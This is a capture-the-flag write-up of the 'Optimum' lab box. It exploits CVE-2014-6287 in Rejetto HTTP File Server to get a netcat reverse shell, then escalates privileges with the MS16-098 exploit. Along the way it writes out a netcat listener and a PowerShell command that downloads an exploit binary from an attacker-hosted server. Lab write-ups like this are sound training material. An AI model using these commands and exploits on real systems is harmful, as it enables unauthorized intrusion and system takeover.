# Optimum Writeup w/o Metasploit

![](https://miro.medium.com/max/577/1*NKZJ6g5IrMlmin0odn-nQw.png)

## Reconnaissance <a id="8798"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA nmap/initial 10.10.10.8
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that only one port is open:

* **Port 80:** running HttpFileServer httpd 2.3.

![](https://miro.medium.com/max/875/1*k9L7TrK7W6-VnZMQawgfcA.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.8
```

We get back the following result. No other ports are open.

![](https://miro.medium.com/max/875/1*ga9SWu1zvxTkW9Vc4vO3Uw.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA nmap/udp 10.10.10.8
```

We get back the following result.

![](https://miro.medium.com/max/820/1*AtOzEE85ZI8b_DN1Sc77MA.png)

Our initial recon shows that our only point of entry is through exploiting the HTTP File Server.

## Enumeration <a id="f550"></a>

Browse to the HTTP File server.

![](https://miro.medium.com/max/715/1*aCNfEc0EKBA3n4lxbDv-9w.png)

It seems to be a server that allows you to remotely access your files over the network. There’s a login page that might be using default credentials. This could potentially allow us to gain an initial foothold. Let’s google the server name and version to learn more about it.

![](https://miro.medium.com/max/780/1*0RMMOpk5wDXeUUM4zknTZw.png)

The first two google entries are publicly disclosed exploits that would give us remote code execution on the box!

Click on the first entry and view the compile instructions.

![](https://miro.medium.com/max/1189/1*w4ypNwoGT8Wa9lNAjPYHUA.png)

To compile the exploit, we need to perform a few tasks:

1. Host a web server on our attack machine \(kali\) on port 80 in a directory that has the netcat executable file.
2. Start a netcat listener on the attack machine.
3. Download the exploit and change the _ip\_addr_ & _local\_port_ variables __in the script to match the ip address of the attack machine and the port that netcat is listening on.
4. Run the script using python as stated in the _Usage_ comment.

Before we do that, let’s try and understand what the script is doing.

![](https://miro.medium.com/max/804/1*CVvuM4vFmi6wv9MjzpuGSg.png)

Everything in yellow \(in double quotes\) is URL encoded. Let’s decode it using an [online encoder/decoder](https://meyerweb.com/eric/tools/dencoder/).

![](https://miro.medium.com/max/782/1*U36Uah44TmAUC7NwFajP0g.png)

Three functions are being called:

* **script\_create\(\):** creates a script \(_script.vbs_\) that when run downloads the nc.exe from our attack machine and saves it to the _C:\Users\Public\_ location on the target machine.
* **execute\_script\(\):** uses the _csscript.exe_ \(command-line version of the Windows Script Host that provides command-line options for setting script properties\) to run _script.vbs_.
* **nc\_run\(\):** runs the the netcat executable and sends a reverse shell back to our attack machine.

Now that we understand what the script is doing, what remains to be answered is why was remote code execution allowed. Further googling tells us the [reason](https://nvd.nist.gov/vuln/detail/CVE-2014-6287).

> The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server \(aks HFS or HttpFileServer\) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.

This makes sense. In the exploit, every time a search is done to run arbitrary code, the _%00_ sequence is used.

## Gaining an Initial Foothold <a id="4a01"></a>

Now that we understand the exploit, let’s run it. In the instructions, the first step is to host a web server on our attack machine \(kali\) on port 80 in a directory that has the netcat executable file.

Locate the Windows netcat executable file in the kali vm.

![](https://miro.medium.com/max/467/1*Qtf_ISBvJObLkgELGf6mmQ.png)

Copy it to the location where the server will be run.

```text
cp nc.exe ~/Desktop/
```

Start the HTTP server.

```text
python -S SimpleHTTPServer
```

The second step is to start a netcat listener on the attack machine.

```text
nc -nlvp 5555
```

The third step is to download the exploit and change the _ip\_addr_ & _local\_port_ variables __in the script to match the ip address of the attack machine and the port that netcat is listening on.

![](https://miro.medium.com/max/875/1*REj-uG7hpQC1kwqs8X3LsQ.png)

![](https://miro.medium.com/max/573/1*P2tOnHK8w5U6R_WZdJoG-Q.png)

The fourth step is to run the exploit.

```text
python 39161.py 10.10.10.8 80
```

We get a non-privileged shell back!

![](https://miro.medium.com/max/569/1*cf31JomNi-3VN4L2ezT7tQ.png)

Grab the user flag.

![](https://miro.medium.com/max/521/1*PQ7nJqA9EYMd6flmEDtzzA.png)

We don’t have system privileges, so we’ll need to find a way to escalate privileges.

## Privilege Escalation <a id="4f80"></a>

We’ll use [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) to identify any missing patches on the Windows target machine that could potentially allow us to escalate privileges.

First, download the script.

```text
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
```

Next, install the dependencies specified in the readme document.

```text
pip install xlrd --upgrade
```

Update the database.

```text
./windows-exploit-suggester.py --update
```

This creates an excel spreadsheet form the Microsoft vulnerability database in the working directory.

The next step is to retrieve the system information from the target machine. This can be done using the “systeminfo” command.

![](https://miro.medium.com/max/919/1*-p8vBM7H9aIjum8m1YaOQQ.png)

Copy the output and save it in a text file “sysinfo.txt” in the Windows Exploit Suggester directory on the attack machine. Then run the following command on the attack machine.

```text
./windows-exploit-suggester.py --database 2019-10-05-mssb.xls --systeminfo sysinfo.txt
```

![](https://miro.medium.com/max/1158/1*FavOCVu4GBX53wndAx_BqQ.png)

The Windows OS seems to be vulnerable to many exploits! Let’s try MS16–098. In the [exploit database](https://www.exploit-db.com/exploits/41020), it gives you a link to a precompiled executable. Download the executable on the attack machine.

```text
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
```

Now we need to transfer it to the target machine. Start up an HTTP server on attack machine in the same directory that the executable file is in.

```text
python -m SimpleHTTPServer 9005
```

In target machine download the file in a directory you have write access to.

```text
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:9005/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"
```

Run the exploit.

![](https://miro.medium.com/max/657/1*rJz8daK8zkXt4ttTTZOqAg.png)

We have system! Grab the root flag.

![](https://miro.medium.com/max/463/1*yvwdKYtBc1geIU5UwobxGA.png)

## Lesson Learned <a id="41f2"></a>

Always update and patch your software! To gain both an initial foothold and escalate privileges, we leveraged publicly disclosed vulnerabilities that have security updates and patches available.

